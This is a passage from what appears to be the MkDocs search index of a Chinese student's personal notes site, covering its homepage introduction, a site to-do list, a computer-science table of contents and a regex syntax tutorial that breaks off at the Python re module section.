{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"o(\u3003'\u25bd'\u3003)o Hi! \u00b6 site.info \u8fd9\u91cc\u662f\u9e64\u7fd4\u4e07\u91cc\uff08TonyCrane\uff09\u7684\u4e2a\u4eba\u7b14\u8bb0\u672c\u54e6 \u4e3b\u8981\u662f\u8ba1\u7b97\u673a\u76f8\u5173\u7684\u5185\u5bb9\u3001CTF \u77e5\u8bc6\u5e93\uff0c\u4ee5\u53ca\u5f52\u6863\u4e86\u4e00\u4e9b CTF \u6bd4\u8d5b\u7684 writeup\uff0c\u8fd8\u6709\u4e00\u4e9b\u6742\u4e03\u6742\u516b\u7684\u4e1c\u897f \u5982\u679c\u53d1\u73b0\u4e86\u6709\u5185\u5bb9\u9519\u8bef\u53ef\u4ee5\u901a\u8fc7\u6587\u672b\u8bc4\u8bba\u544a\u8bc9\u6211\u5417qwq \u5927\u6982\u662f\u968f\u65f6\u66f4\u65b0\uff0c\u968f\u65f6\u5495\u5495\u5495 about(site.author) 18 \u5c81\uff0c\u4e8b\u6d59\u6c5f\u5927\u5b66\u4fe1\u606f\u5b89\u5168\u4e13\u4e1a\u5927\u4e8c\u5b66\u751f\uff0c\u4e8b\u54d4\u54e9\u54d4\u54e9 up \u4e3b @\u9e64\u7fd4\u4e07\u91cc \uff0c\u4e8b AAA \u6218\u961f misc \u624b @TonyCrane \u4e3b\u9875\uff1a https://tonycrane.cc/ \u535a\u5ba2\uff1a https://blog.tonycrane.cc/ GitHub\uff1a https://github.com/TonyCrane/ script.py if visitor . name == 'TonyCrane' : print ( f \"\u770b\u4ec0\u4e48\u770b\uff0c\u5feb\u53bb\u5b66\u4e60/\u505a\u89c6\u9891/\u5199\u7b14\u8bb0/\u6253CTF/ { '/' . join ( tasks ) } \\n \" ) logging . warning ( \"\u522b\u6478\u4e86\" ) else : print ( \"\u5e0c\u671b\u8fd9\u4e2a\u5c0f\u7834\u7ad9\u70b9\u80fd\u5bf9\u4f60\u6709\u6240\u5e2e\u52a9\u30fd(*\u00b4\u2200\uff40)\u516b(\u00b4\u2200\uff40*)\u30ce \\n \" ) thanks_list . append ( visitor . name )","title":"o(\u3003'\u25bd'\u3003)o Hi!"},{"location":"#oo-hi","text":"site.info \u8fd9\u91cc\u662f\u9e64\u7fd4\u4e07\u91cc\uff08TonyCrane\uff09\u7684\u4e2a\u4eba\u7b14\u8bb0\u672c\u54e6 \u4e3b\u8981\u662f\u8ba1\u7b97\u673a\u76f8\u5173\u7684\u5185\u5bb9\u3001CTF \u77e5\u8bc6\u5e93\uff0c\u4ee5\u53ca\u5f52\u6863\u4e86\u4e00\u4e9b CTF \u6bd4\u8d5b\u7684 writeup\uff0c\u8fd8\u6709\u4e00\u4e9b\u6742\u4e03\u6742\u516b\u7684\u4e1c\u897f \u5982\u679c\u53d1\u73b0\u4e86\u6709\u5185\u5bb9\u9519\u8bef\u53ef\u4ee5\u901a\u8fc7\u6587\u672b\u8bc4\u8bba\u544a\u8bc9\u6211\u5417qwq \u5927\u6982\u662f\u968f\u65f6\u66f4\u65b0\uff0c\u968f\u65f6\u5495\u5495\u5495 about(site.author) 18 \u5c81\uff0c\u4e8b\u6d59\u6c5f\u5927\u5b66\u4fe1\u606f\u5b89\u5168\u4e13\u4e1a\u5927\u4e8c\u5b66\u751f\uff0c\u4e8b\u54d4\u54e9\u54d4\u54e9 up \u4e3b @\u9e64\u7fd4\u4e07\u91cc \uff0c\u4e8b AAA \u6218\u961f misc \u624b @TonyCrane \u4e3b\u9875\uff1a https://tonycrane.cc/ \u535a\u5ba2\uff1a https://blog.tonycrane.cc/ GitHub\uff1a https://github.com/TonyCrane/ script.py if visitor . name == 'TonyCrane' : print ( f \"\u770b\u4ec0\u4e48\u770b\uff0c\u5feb\u53bb\u5b66\u4e60/\u505a\u89c6\u9891/\u5199\u7b14\u8bb0/\u6253CTF/ { '/' . join ( tasks ) } \\n \" ) logging . warning ( \"\u522b\u6478\u4e86\" ) else : print ( \"\u5e0c\u671b\u8fd9\u4e2a\u5c0f\u7834\u7ad9\u70b9\u80fd\u5bf9\u4f60\u6709\u6240\u5e2e\u52a9\u30fd(*\u00b4\u2200\uff40)\u516b(\u00b4\u2200\uff40*)\u30ce \\n \" ) thanks_list . append ( visitor . name )","title":"o(\u3003'\u25bd'\u3003)o Hi!"},{"location":"todo/","text":"\u4ee3\u529e\u4e8b\u9879 \u00b6 \u5efa\u7ad9\u7c7b \u00b6 List nav \u680f\u989c\u8272 \u6697\u8272\u4e3b\u9898 \u5b57\u4f53\u5927\u5c0f h1 h2 \u7684 font-weight\uff08\u8c8c\u4f3c\u624b\u673a\u4e0a\u6ca1\u95ee\u9898\uff1f\uff09 \u884c\u8ddd \u4fee\u516c\u5f0f\u6e32\u67d3 \u4e3b\u9875\u3001\u5173\u4e8e \u9875\u811a\u7248\u6743\u4fe1\u606f \u9875\u811a\u8054\u7cfb\u65b9\u5f0f \u94fe\u63a5 GitHub \u4ed3\u5e93 tasklist \u6837\u5f0f \u642c\u8fd0\u535a\u5ba2 \u4e8c\u7ef4\u7801 Haskell hackergame writeup \u642c\u51e0\u4e2a\u6bd4\u8d5b\u7684 writeup \u5efa\u7acb writeup \u5206\u533a \u5efa\u7acb \u8ba1\u7b97\u673a \u5206\u533a \u90e8\u7f72\u5230\u4e91\u670d\u52a1\u5668 \uff08\u6682\u4e0d\u6253\u7b97\uff09 \u5de6\u4e0a\u89d2 logo \u5b8c\u5584 css \u7ed1\u5b9a\u57df\u540d \u516c\u5f00 repo \u663e\u793a\u6700\u540e\u4fee\u6539\u65f6\u95f4 GitHub repo \u6dfb\u52a0 README \u624b\u673a\u7aef\u989c\u8272\u95ee\u9898 \u4ee3\u7801\u5757\u80cc\u666f\u548c\u535a\u5ba2\u540c\u6b65 \u4ee3\u7801\u914d\u8272\u65b9\u6848\u548c\u535a\u5ba2\u540c\u6b65 \uff08\u4e0d\u5fc5\u540c\u6b65\uff09 \u81ea\u52a8\u6697\u8272 \u6dfb\u52a0 icons \u548c emojis \u53f3\u4fa7 toc \u6df1\u5ea6\u8c03\u6574 \u5de6\u4fa7 nav \u6df1\u5ea6\u8c03\u6574 \u4e3a\u6bcf\u4e2a\u5206\u533a\u6dfb\u52a0 index cs cs/pl ctf writeups \u8bbf\u95ee\u7edf\u8ba1 Google Analytics \u767e\u5ea6\u7edf\u8ba1 \u642c\u4e00\u4e9b notion \u4e0a\u7684 misc kb \u628a yml \u5f04\u5e72\u51c0\u4e00\u70b9 \u5199\u4e00\u4e0b mkdocs \u7528\u6cd5 \u6807\u9898\u524d\u7f00\u6570\u5b57 \u642d\u4e2a\u7f51\u76d8 \u6587\u4ef6\u94fe\u63a5 \u5de5\u5177\u7c7b \u00b6 \u4fee\u6539 mkdocs \u6e90\u7801\uff0c\u52a0\u5feb\u9884\u89c8\u6784\u5efa\u901f\u5ea6 \u4f7f\u7528 rich \u7f8e\u5316 log \u8f93\u51fa \u6539\u5584 encryption \u63d2\u4ef6 \u4fee\u6539 mkdocs\uff0cserve \u65f6\u4ec5\u91cd\u65b0\u6e32\u67d3\u4fee\u6539\u90e8\u5206 \u7b14\u8bb0\u7c7b \u00b6 x86 \u6c47\u7f16\u8bed\u8a00 \u8865\u5145 186\uff5e386 \u6307\u4ee4 \u8865\u5145 fl \u5f71\u54cd RISC-V \u6c47\u7f16\u8bed\u8a00 \u8865\u5145\u6269\u5c55\u6307\u4ee4\u96c6\u6307\u4ee4 \u68c0\u67e5\u5404 index \u7cfb\u7edf\u4e00\u76f8\u5173 \u7406\u8bba\u8bfe lab \u7cfb\u7edf\u4e8c\u76f8\u5173 \u8865\u4e00\u4e0b\u524d\u4e24\u8282\u8bfe\u7684\u7b14\u8bb0 CTF ETH \u57fa\u7840\u77e5\u8bc6 \u5e38\u89c1\u6f0f\u6d1e Python \u76f8\u5173 Lecture \u6587\u5b57\u7248 NumPy PIL matplotlib HPC SIMD ML \u5efa\u7acb\u8bfe\u7a0b\u7b14\u8bb0\u9875\u9762 \u4eba\u5de5\u667a\u80fd\u57fa\u7840 \u6570\u636e\u7ed3\u6784\u57fa\u7840 \u5de5\u5177 index docker GitHub Action Git Writeups TCTF NFT \u5f3a\u7f51\u676f\u789f\u5f71\u91cd\u91cd Rust \u6e90\u7801\u5256\u6790 index mkdocs log4j \u6f0f\u6d1e\u590d\u73b0\u5b58\u4e2a\u6863","title":"\u4ee3\u529e\u4e8b\u9879"},{"location":"todo/#_1","text":"","title":"\u4ee3\u529e\u4e8b\u9879"},{"location":"todo/#_2","text":"List nav \u680f\u989c\u8272 \u6697\u8272\u4e3b\u9898 \u5b57\u4f53\u5927\u5c0f h1 h2 \u7684 font-weight\uff08\u8c8c\u4f3c\u624b\u673a\u4e0a\u6ca1\u95ee\u9898\uff1f\uff09 \u884c\u8ddd \u4fee\u516c\u5f0f\u6e32\u67d3 \u4e3b\u9875\u3001\u5173\u4e8e \u9875\u811a\u7248\u6743\u4fe1\u606f \u9875\u811a\u8054\u7cfb\u65b9\u5f0f \u94fe\u63a5 GitHub \u4ed3\u5e93 tasklist \u6837\u5f0f \u642c\u8fd0\u535a\u5ba2 \u4e8c\u7ef4\u7801 Haskell hackergame writeup \u642c\u51e0\u4e2a\u6bd4\u8d5b\u7684 writeup \u5efa\u7acb writeup \u5206\u533a \u5efa\u7acb \u8ba1\u7b97\u673a \u5206\u533a \u90e8\u7f72\u5230\u4e91\u670d\u52a1\u5668 \uff08\u6682\u4e0d\u6253\u7b97\uff09 \u5de6\u4e0a\u89d2 logo \u5b8c\u5584 css \u7ed1\u5b9a\u57df\u540d \u516c\u5f00 repo \u663e\u793a\u6700\u540e\u4fee\u6539\u65f6\u95f4 GitHub repo \u6dfb\u52a0 README \u624b\u673a\u7aef\u989c\u8272\u95ee\u9898 \u4ee3\u7801\u5757\u80cc\u666f\u548c\u535a\u5ba2\u540c\u6b65 \u4ee3\u7801\u914d\u8272\u65b9\u6848\u548c\u535a\u5ba2\u540c\u6b65 \uff08\u4e0d\u5fc5\u540c\u6b65\uff09 \u81ea\u52a8\u6697\u8272 \u6dfb\u52a0 icons \u548c emojis \u53f3\u4fa7 toc \u6df1\u5ea6\u8c03\u6574 \u5de6\u4fa7 nav \u6df1\u5ea6\u8c03\u6574 \u4e3a\u6bcf\u4e2a\u5206\u533a\u6dfb\u52a0 index cs cs/pl ctf writeups \u8bbf\u95ee\u7edf\u8ba1 Google Analytics \u767e\u5ea6\u7edf\u8ba1 \u642c\u4e00\u4e9b notion \u4e0a\u7684 misc kb \u628a yml \u5f04\u5e72\u51c0\u4e00\u70b9 \u5199\u4e00\u4e0b mkdocs \u7528\u6cd5 \u6807\u9898\u524d\u7f00\u6570\u5b57 \u642d\u4e2a\u7f51\u76d8 \u6587\u4ef6\u94fe\u63a5","title":"\u5efa\u7ad9\u7c7b"},{"location":"todo/#_3","text":"\u4fee\u6539 mkdocs \u6e90\u7801\uff0c\u52a0\u5feb\u9884\u89c8\u6784\u5efa\u901f\u5ea6 \u4f7f\u7528 rich \u7f8e\u5316 log \u8f93\u51fa \u6539\u5584 encryption \u63d2\u4ef6 \u4fee\u6539 mkdocs\uff0cserve \u65f6\u4ec5\u91cd\u65b0\u6e32\u67d3\u4fee\u6539\u90e8\u5206","title":"\u5de5\u5177\u7c7b"},{"location":"todo/#_4","text":"x86 \u6c47\u7f16\u8bed\u8a00 \u8865\u5145 186\uff5e386 \u6307\u4ee4 \u8865\u5145 fl \u5f71\u54cd RISC-V \u6c47\u7f16\u8bed\u8a00 \u8865\u5145\u6269\u5c55\u6307\u4ee4\u96c6\u6307\u4ee4 \u68c0\u67e5\u5404 index \u7cfb\u7edf\u4e00\u76f8\u5173 \u7406\u8bba\u8bfe lab \u7cfb\u7edf\u4e8c\u76f8\u5173 \u8865\u4e00\u4e0b\u524d\u4e24\u8282\u8bfe\u7684\u7b14\u8bb0 CTF ETH \u57fa\u7840\u77e5\u8bc6 \u5e38\u89c1\u6f0f\u6d1e Python \u76f8\u5173 Lecture \u6587\u5b57\u7248 NumPy PIL matplotlib HPC SIMD ML \u5efa\u7acb\u8bfe\u7a0b\u7b14\u8bb0\u9875\u9762 \u4eba\u5de5\u667a\u80fd\u57fa\u7840 \u6570\u636e\u7ed3\u6784\u57fa\u7840 \u5de5\u5177 index docker GitHub Action Git Writeups TCTF NFT \u5f3a\u7f51\u676f\u789f\u5f71\u91cd\u91cd Rust \u6e90\u7801\u5256\u6790 index mkdocs log4j \u6f0f\u6d1e\u590d\u73b0\u5b58\u4e2a\u6863","title":"\u7b14\u8bb0\u7c7b"},{"location":"cs/","text":"Computer Science \u00b6 Abstract \u8fd9\u91cc\u662f\u8ba1\u7b97\u673a\u79d1\u5b66\u76f8\u5173\u5185\u5bb9\u7684\u7b14\u8bb0 \u6709\u7684\u662f\u81ea\u5b66\u7684\u7b14\u8bb0\uff0c\u6709\u7684\u662f\u8bfe\u7a0b\u7b14\u8bb0 Table of Contents \u00b6 Programming Language \u7f16\u7a0b\u8bed\u8a00 & ISA Python Rust C/C++ Haskell x86 Assembly RISC-V ISA Computer System \u8ba1\u7b97\u673a\u7cfb\u7edf Computer System I \u8ba1\u7b97\u673a\u7cfb\u7edf \u2160 Computer System II \u8ba1\u7b97\u673a\u7cfb\u7edf \u2161 \u7b97\u6cd5\u76f8\u5173 \u6570\u636e\u7ed3\u6784\u57fa\u7840 \u4eba\u5de5\u667a\u80fd\u76f8\u5173 \u4eba\u5de5\u667a\u80fd\u57fa\u7840 Web \u76f8\u5173 \u7f51\u7edc\u534f\u8bae SVG log4j \u6f0f\u6d1e\u590d\u73b0 \u96f6\u6563\u77e5\u8bc6\u70b9 RegEx \u6b63\u5219\u8868\u8fbe\u5f0f Unicode \u7edf\u4e00\u7801 \u6e90\u7801\u5256\u6790 mkdocs \u6e90\u7801\u5256\u6790 \u5de5\u5177\u76f8\u5173 Git \u547d\u4ee4\u5907\u5fd8 Shell \u547d\u4ee4\u5907\u5fd8 Docker \u76f8\u5173\u5907\u5fd8 gdb \u76f8\u5173\u5907\u5fd8 mkdocs \u4f7f\u7528\u8bb0\u5f55 hexo \u4f7f\u7528\u8bb0\u5f55 sphinx \u4f7f\u7528\u8bb0\u5f55","title":"Computer Science"},{"location":"cs/#computer-science","text":"Abstract \u8fd9\u91cc\u662f\u8ba1\u7b97\u673a\u79d1\u5b66\u76f8\u5173\u5185\u5bb9\u7684\u7b14\u8bb0 \u6709\u7684\u662f\u81ea\u5b66\u7684\u7b14\u8bb0\uff0c\u6709\u7684\u662f\u8bfe\u7a0b\u7b14\u8bb0","title":"Computer Science"},{"location":"cs/#table-of-contents","text":"Programming Language \u7f16\u7a0b\u8bed\u8a00 & ISA Python Rust C/C++ Haskell x86 Assembly RISC-V ISA Computer System \u8ba1\u7b97\u673a\u7cfb\u7edf Computer System I \u8ba1\u7b97\u673a\u7cfb\u7edf \u2160 Computer System II \u8ba1\u7b97\u673a\u7cfb\u7edf \u2161 \u7b97\u6cd5\u76f8\u5173 \u6570\u636e\u7ed3\u6784\u57fa\u7840 \u4eba\u5de5\u667a\u80fd\u76f8\u5173 \u4eba\u5de5\u667a\u80fd\u57fa\u7840 Web \u76f8\u5173 \u7f51\u7edc\u534f\u8bae SVG log4j \u6f0f\u6d1e\u590d\u73b0 \u96f6\u6563\u77e5\u8bc6\u70b9 RegEx \u6b63\u5219\u8868\u8fbe\u5f0f Unicode \u7edf\u4e00\u7801 \u6e90\u7801\u5256\u6790 mkdocs \u6e90\u7801\u5256\u6790 \u5de5\u5177\u76f8\u5173 Git \u547d\u4ee4\u5907\u5fd8 Shell \u547d\u4ee4\u5907\u5fd8 Docker \u76f8\u5173\u5907\u5fd8 gdb \u76f8\u5173\u5907\u5fd8 mkdocs \u4f7f\u7528\u8bb0\u5f55 hexo \u4f7f\u7528\u8bb0\u5f55 sphinx \u4f7f\u7528\u8bb0\u5f55","title":"Table of Contents"},{"location":"cs/regex/","text":"\u6b63\u5219\u8868\u8fbe\u5f0f \u00b6 \u6b63\u5219\u8868\u8fbe\u5f0f\uff08Regular Expression\uff09\u4f7f\u7528\u5355\u4e2a\u5b57\u7b26\u4e32\u6765\u63cf\u8ff0\u3001\u5339\u914d\u4e00\u7cfb\u5217\u5339\u914d\u67d0\u4e2a\u53e5\u6cd5\u89c4\u5219\u7684\u5b57\u7b26\u4e32\u3002 \u2014\u2014\u2014\u2014 \u7ef4\u57fa\u767e\u79d1 Abstract \u6b63\u5219\u8868\u8fbe\u5f0f\u7528\u9014\u5e7f\u6cdb\uff0c\u800c\u4e14\u529f\u80fd\u5f3a\u5927\u53c8\u597d\u7528\u3002\u53ef\u4ee5\u8bf4\u65e2\u7b80\u5355\u53c8\u7e41\u7410\uff0c\u4f46\u662f\u7528\u8d77\u6765\u5f88\u723d \u4e00\u4e9b\u5de5\u5177\uff1a RegExr \u6b63\u5219\u5728\u7ebf\u6d4b\u8bd5\u5de5\u5177 Regulex \u6b63\u5219\u8868\u8fbe\u5f0f\u53ef\u89c6\u5316 HackerRank regex \u4e60\u9898\u96c6 \u8bed\u6cd5 \u00b6 \u666e\u901a\u5b57\u7b26 \u00b6 \u6240\u6709\u4e0d\u662f\u5143\u5b57\u7b26\u7684\u5b57\u7b26\u90fd\u53ef\u4ee5\u76f4\u63a5\u5199\u51fa\u6765\u7528\u6765\u5339\u914d\uff0c\u6bd4\u5982\u5927\u5c0f\u5199\u5b57\u6bcd\u3001\u6570\u5b57\u3001\u7b26\u53f7\u7b49 \u6709\u8bed\u6cd5\u610f\u4e49\u7684\u5b57\u7b26\u9700\u8981\u4f7f\u7528 \u8f6c\u4e49\uff0c\u6bd4\u5982 \\( \\) \\[ \\] \\. \u5206\u522b\u5339\u914d ()[]. \u8fd9\u4e94\u4e2a\u5b57\u7b26 \u8bed\u6cd5 \u63cf\u8ff0 [...] \u5339\u914d\u4efb\u610f\u5728 ... \u4e2d\u7684\u5b57\u7b26\uff0c\u5982 [ABC] \u5339\u914d\u6240\u6709 A B C \u5b57\u7b26 [^...] \u5339\u914d\u4efb\u610f\u4e0d\u5728 ... \u4e2d\u7684\u5b57\u7b26\uff0c\u5982 [^ABC] \u5339\u914d\u9664\u4e86 A B C \u5916\u7684\u6240\u6709\u5355\u4e2a\u5b57\u7b26 [x-y] \u6309\u7167\u987a\u5e8f\u5339\u914d\u4ece x \u5230 y \u5230\u6240\u6709\u5b57\u7b26\uff0c\u5982 [a-z] \u5339\u914d\u6240\u6709\u5c0f\u5199\u5b57\u6bcd\uff0c[A-E] \u5339\u914d A \u5230 E \u8fd9\u4e94\u4e2a\u5b57\u7b26\uff5c . \u5339\u914d\u4efb\u610f\u9664\u4e86\u6362\u884c\u7b26\u4ee5\u5916\u7684\u5b57\u7b26 \\w \u5339\u914d\u5b57\u6bcd\u6570\u5b57\u4e0b\u5212\u7ebf\uff0c\u76f8\u5f53\u4e8e [a-zA-Z0-9_] x|y \u5339\u914d x \u6216 y \uff0c\u4f18\u5148\u7ea7\u6700\u4f4e\uff0c\u5982 a|bcd \u5339\u914d a \u6216 bcd \u975e\u6253\u5370\u5b57\u7b26 \u00b6 \u8bed\u6cd5 \u63cf\u8ff0 \\cx \u5339\u914d\u7531 x \u6307\u660e\u7684\u63a7\u5236\u5b57\u7b26\uff0cx \u5fc5\u987b\u5c5e\u4e8e [a-zA-Z]\uff0c\u5426\u5219 \\c \u76f4\u63a5\u89c6\u4e3a c\uff0c\u5982 \\cM \u5339\u914d Ctrl-M \u5373\u56de\u8f66\u7b26 \\f \u5339\u914d\u4e00\u4e2a\u6362\u9875\u7b26\uff0c\u76f8\u5f53\u4e8e \\x0c \\cL \\n \u5339\u914d\u4e00\u4e2a\u6362\u884c\u7b26\uff0c\u76f8\u5f53\u4e8e \\x0a \\cJ \\r \u5339\u914d\u4e00\u4e2a\u56de\u8f66\u7b26\uff0c\u76f8\u5f53\u4e8e \\x0d \\cM \\t \u5339\u914d\u4e00\u4e2a\u5236\u8868\u7b26\uff0c\u76f8\u5f53\u4e8e \\x09 \\cI \\v \u5339\u914d\u4e00\u4e2a\u5782\u76f4\u5236\u8868\u7b26\uff0c\u76f8\u5f53\u4e8e \\x0b \\cK \\s \u5339\u914d\u4efb\u4f55\u7a7a\u767d\u5b57\u7b26\uff0c\u76f8\u5f53\u4e8e [ \\f\\n\\r\\t\\v]\uff0cunicode \u4e0b\u4e5f\u4f1a\u5339\u914d\u5168\u89d2\u7a7a\u683c\u7b26 \\S \u5339\u914d\u4efb\u4f55\u975e\u7a7a\u767d\u7b26\uff0c\u76f8\u5f53\u4e8e [^ \\f\\n\\r\\t\\v] \u9650\u5b9a\u7b26 \u00b6 \u7528\u6765\u6307\u5b9a\u4e00\u4e2a\u5b50\u8868\u8fbe\u5f0f\u51fa\u73b0\u4e86\u591a\u5c11\u6b21 \u8bed\u6cd5 \u63cf\u8ff0 {n} \u524d\u4e00\u4e2a\u5b50\u8868\u8fbe\u5f0f\u5339\u914d\u51c6\u786e\u7684 n \u6b21\uff0c\u5982 o{2} \u5339\u914d\u4e24\u4e2a\u8fde\u7eed\u7684 o {n,} \u524d\u4e00\u4e2a\u5b50\u8868\u8fbe\u5f0f\u5339\u914d\u81f3\u5c11 n \u6b21\uff0c\u5982 o{2,} \u53ef\u4ee5\u5339\u914d goooood \u4e2d\u7684\u6240\u6709 o\uff0c\u4f46\u4e0d\u5339\u914d god \u4e2d\u7684 o {n,m} \u524d\u4e00\u4e2a\u5b50\u8868\u8fbe\u5f0f\u5339\u914d\u81f3\u5c11 n \u6b21\uff0c\u81f3\u591a m \u6b21 * \u524d\u4e00\u4e2a\u5b50\u8868\u8fbe\u5f0f\u5339\u914d 0 \u6b21\u6216\u591a\u6b21\uff0c\u76f8\u5f53\u4e8e {0,} + \u524d\u4e00\u4e2a\u5b50\u8868\u8fbe\u5f0f\u5339\u914d 1 \u6b21\u6216\u591a\u6b21\uff0c\u76f8\u5f53\u4e8e {1,} ? \u524d\u4e00\u4e2a\u5b50\u8868\u8fbe\u5f0f\u53ef\u6709\u53ef\u65e0\uff08\u5339\u914d 0 \u6b21\u6216 1 \u6b21\uff09\uff0c\u76f8\u5f53\u4e8e {0,1} \u8d2a\u5a6a \u00b6 * \u548c + \u7684\u5339\u914d\u90fd\u662f\u8d2a\u5a6a\u7684\uff0c\u5373\u5c3d\u53ef\u80fd\u5339\u914d\u66f4\u591a\u7684\u5b57\u7b26\uff0c\u800c\u5728\u5b83\u4eec\u540e\u9762\u52a0\u4e0a ? \u5c31\u53ef\u4ee5\u975e\u8d2a\u5a6a\uff08\u5373\u6700\u5c0f\u5339\u914d\uff09 <.*> \u4f1a\u5339\u914d\u6574\u4e2a <h1>header</h1> \u5b57\u7b26\u4e32 <.*?> \u53ea\u4f1a\u5339\u914d\u5176\u4e2d\u7684 <h1> \u548c </h1> \u5b9a\u4f4d\u7b26 \u00b6 \u53ea\u5339\u914d\u4f4d\u7f6e\uff0c\u6ca1\u6709\u5b57\u7b26\u4e0e\u4e4b\u5bf9\u5e94 \u8bed\u6cd5 \u63cf\u8ff0 ^ \u5339\u914d\u5b57\u7b26\u4e32\u5f00\u5934\uff0c\u5982\u679c\u662f\u591a\u884c\u6a21\u5f0f\uff0c\u5219\u65b0\u7684\u4e00\u884c\u4e5f\u7b97\u65b0\u7684\u5b57\u7b26\u4e32 $ \u5339\u914d\u5b57\u7b26\u4e32\u7ed3\u5c3e\uff0c\u591a\u884c\u6a21\u5f0f\u540c\u7406\u770b\u6210\u591a\u4e2a\u5b57\u7b26\u4e32 \\b \u5339\u914d\u5355\u8bcd\u8fb9\u754c\uff0c\u5373\u5b57\u7b26\u4e0e\u7a7a\u683c\u4e2d\u95f4\u7684\u4f4d\u7f6e \\B \u5339\u914d\u975e\u5355\u8bcd\u8fb9\u754c \u5b9a\u4f4d\u7b26\u53ea\u80fd\u5355\u72ec\u4f7f\u7528\uff0c\u4e0d\u80fd\u9644\u52a0\u9650\u5236\u7b26\u6307\u5b9a\u4e2a\u6570 \u5206\u7ec4 \u00b6 \u7528 () \u53ef\u4ee5\u6307\u5b9a\u5339\u914d\u4e00\u4e2a\u7ec4\uff0c\u4f7f\u7528 () \u53ef\u4ee5\u6307\u5b9a\u4e0d\u540c\u9009\u9879\uff0c\u6bcf\u4e00\u9879\u95f4\u7528 | \u5206\u9694 \u540c\u65f6 () \u4e5f\u662f\u6355\u83b7\u5206\u7ec4\uff0c\u5373\u62ec\u53f7\u5185\u5339\u914d\u7684\u5185\u5bb9\u4f1a\u88ab\u7f13\u5b58\uff0c\u5982\u679c\u8981\u907f\u514d\u8fd9\u79cd\uff0c\u9700\u8981\u4f7f\u7528 (?:) \u975e\u6355\u83b7\u5143\u6765\u8fdb\u884c\u5339\u914d \u53cd\u5411\u5f15\u7528 \u00b6 \u88ab\u7f13\u5b58\u7684\u6355\u83b7\u5206\u7ec4\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528 \\n \u518d\u6b21\u5f15\u7528\uff0c\u5176\u4e2d n \u662f 1 \u5230 2 \u4f4d\u7684\u5341\u8fdb\u5236\u6570 \u6355\u83b7\u5206\u7ec4\u7684\u7f16\u53f7\u4ece 1 \u5f00\u59cb\uff0c\u6700\u591a 99 \u4e2a\uff0c\\1 \u5373\u8868\u793a\u548c\u7b2c\u4e00\u4e2a\u5706\u62ec\u53f7\u4e2d\u5339\u914d\u7684\u7ed3\u679c\u76f8\u540c\u7684\u90e8\u5206 \u5982 (abc|def)\\1 \u5339\u914d abcabc\u3001defdef \u4f46\u4e0d\u5339\u914d abcdef\u3001defabc \u5148\u884c\u65ad\u8a00\u548c\u540e\u884c\u65ad\u8a00 \u00b6 \u6b63\u5219\u8868\u8fbe\u5f0f\u6709\u5148\u884c\u65ad\u8a00\uff08lookahead\uff09\u548c\u540e\u884c\u65ad\u8a00\uff08lookbehind\uff09\uff0c\u5206\u4e3a\u56db\u79cd\u5f62\u5f0f\uff1a \u8bed\u6cd5 \u540d\u79f0 (?=pattern) \u96f6\u5bbd\u6b63\u5411\u5148\u884c\u65ad\u8a00 zero-width positive lookahead assertion (?!pattern) \u96f6\u5bbd\u8d1f\u5411\u5148\u884c\u65ad\u8a00 zero-width negative lookahead assertion (?<=pattern) \u96f6\u5bbd\u6b63\u5411\u540e\u884c\u65ad\u8a00 zero-width positive lookbehind assertion (?<!pattern) \u96f6\u5bbd\u8d1f\u5411\u540e\u884c\u65ad\u8a00 zero-width negative lookbehind assertion \u548c\u5b9a\u4f4d\u7b26\u7c7b\u4f3c\uff0c\u5b83\u53ea\u5339\u914d\u4f4d\u7f6e\uff0c\u4e0d\u5339\u914d\u5185\u5bb9\uff0c\u6240\u4ee5\u53eb\u505a\u96f6\u5bbd\uff08zero-width\uff09\uff0c\u8fd9\u4e9b\u4f4d\u7f6e\u7684\u89c4\u5219\u662f\uff1a (?=pattern)\uff1a\u5339\u914d\u540e\u9762\u53ef\u4ee5\u5339\u914d pattern \u7684\u4f4d\u7f6e (?!pattern)\uff1a\u5339\u914d\u540e\u9762\u65e0\u6cd5\u5339\u914d pattern \u7684\u4f4d\u7f6e (?<=pattern) \uff1a\u5339\u914d\u524d\u9762\u53ef\u4ee5\u5339\u914d pattern \u7684\u4f4d\u7f6e (?<!pattern)\uff1a\u5339\u914d\u524d\u9762\u65e0\u6cd5\u5339\u914d pattern \u7684\u4f4d\u7f6e \u4f8b\u5b50 \u5176\u4e2d\u540e\u884c\u65ad\u8a00\u6709\u4e9b\u8bed\u8a00\u4e0d\u652f\u6301\uff08python re \u652f\u6301\uff09 \u4fee\u9970\u7b26 \u00b6 \u4fee\u9970\u7b26\u4e0d\u5c5e\u4e8e\u8868\u8fbe\u5f0f\u7684\u5185\u5bb9\uff0c\u4f46\u662f\u6307\u5b9a\u4e86\u5339\u914d\u7684\u89c4\u5219\uff0cjs \u4e2d\u7684\u6b63\u5219\u5199\u6cd5\u4e3a /pattern/flags \u5176\u4e2d flags \u5c31\u662f\u4fee\u9970\u7b26 \u4fee\u9970\u7b26 \u540d\u79f0 \u542b\u4e49 i ignore \u5ffd\u7565\u5927\u5c0f\u5199 g global \u5168\u5c40\u5339\u914d\uff0c\u67e5\u627e\u6240\u6709\u5339\u914d\u9879 m multi-line \u591a\u884c\u5339\u914d\uff0c\u4f7f ^$ \u5339\u914d\u6bcf\u884c\u7684\u5f00\u5934\u548c\u7ed3\u5c3e s single-line \u5355\u884c\u5339\u914d\uff0c\u53ea\u89c6\u4e3a\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c. \u4e5f\u53ef\u4ee5\u5339\u914d\u6362\u884c\u7b26 \u4e0d\u540c\u8bed\u8a00\u4e2d\u5199\u6cd5\u548c\u79cd\u7c7b\u4e0d\u540c \u4f18\u5148\u7ea7 \u00b6 \u6b63\u5219\u8868\u8fbe\u5f0f\u4e5f\u6709\u4f18\u5148\u7ea7\uff0c\u540c\u4e00\u4f18\u5148\u7ea7\u5219\u4ece\u5de6\u5411\u53f3\u8fd0\u7b97\uff0c\u4e0d\u540c\u4f18\u5148\u7ea7\u5219\u4ece\u9ad8\u5230\u4f4e\u3002\u4ece\u9ad8\u5230\u4f4e\uff1a \u8f6c\u4e49\u7b26 \\ \u62ec\u53f7\u7b26 (...) (?:...) (?=...) (?!...) (?<=...) (?<!...) [...] [^...] \u9650\u5b9a\u7b26 * + ? {n} {n,} {n,m} \u5b9a\u4f4d\u7b26 ^ $ \u5b57\u7b26 \u6216 | Python re \u6a21\u5757 \u00b6 python \u7684 re 